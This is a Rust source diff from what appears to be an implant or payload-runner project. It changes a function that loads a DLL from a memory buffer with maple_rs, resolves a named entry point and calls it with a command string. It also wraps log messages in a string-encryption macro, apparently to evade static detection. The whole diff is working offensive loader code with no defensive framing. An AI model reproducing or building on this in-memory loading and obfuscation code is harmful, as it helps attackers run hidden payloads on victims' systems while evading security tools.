@@ -11,16 +11,16 @@ use crate::payload_util::fail_linux_message;
 #[cfg(target_os = "linux")]
 use crate::payload_util::set_permission;
 
-//#[cfg(target_os = "windows")]
-//type DllEntryPoint = extern "C" fn(*const c_char); //type DllEntryPoint = extern "C" fn() -> c_int;
+
+#[cfg(target_os = "windows")]
+use maple_rs::MemoryModuleBuilder;
+
 #[cfg(target_os = "windows")]
 use crate::python_embedder;
 //#[cfg(target_os = "windows")]
 //use rspe::reflective_loader;
 #[cfg(target_os = "windows")]
 use std::ffi::CString;
-//#[cfg(target_os = "windows")]
-//use std::mem;
 #[cfg(target_os = "windows")]
 use std::os::raw::c_char; //use std::os::raw::c_int;
 #[cfg(target_os = "windows")]
@@ -211,10 +211,11 @@ impl DLM {
     }
 }
 
+
 #[cfg(target_os = "windows")]
 pub fn dll_from_memory_exec(data: Vec<u8>, dll_entrypoint: String, dll_commandline: String) {
-    use maple_rs::MemoryModuleBuilder;
-
+    
+    info!("{}",encrypt_string!("load DLL in memory"));
     let module = match MemoryModuleBuilder::new()
         .resolve_imports(true)
         .process_relocations(true)
@@ -222,20 +223,23 @@ pub fn dll_from_memory_exec(data: Vec<u8>, dll_entrypoint: String, dll_commandli
         .load_from_memory(&data)
     {
         Ok(m) => m,
-        Err(e) => { error!("maple-rs failed: {:?}", e); return; }
+        Err(e) => { error!("{}{:?}", encrypt_string!("maple-rs failed: "), e); return; }
     };
 
+
+    info!("{}",encrypt_string!("module.get_proc_address"));
     let fn_ptr = match module.get_proc_address(&dll_entrypoint) {
         Ok(p) => p,
-        Err(e) => { error!("entrypoint not found: {:?}", e); return; }
+        Err(e) => { error!("{}{:?}",encrypt_string!("entrypoint not found: ") , e); std::mem::forget(module);return; }
     };
 
     // Signature originale qui fonctionnait
-    type DllInstall = unsafe extern "C" fn(*const c_char);
-    let dll_install = unsafe { std::mem::transmute::<_, DllInstall>(fn_ptr) };
+    type DllEntryPoint = unsafe extern "C" fn(*const c_char);
+    let dll_entry_point_fun = unsafe { std::mem::transmute::<_, DllEntryPoint>(fn_ptr) };
 
+    info!("{}({})",dll_entrypoint,dll_commandline);
     let c_cmd = CString::new(dll_commandline).unwrap();
-    let _result = unsafe { dll_install(c_cmd.as_ptr()) };
+    let _result = unsafe { dll_entry_point_fun(c_cmd.as_ptr()) };
 
     std::mem::forget(module);
 }
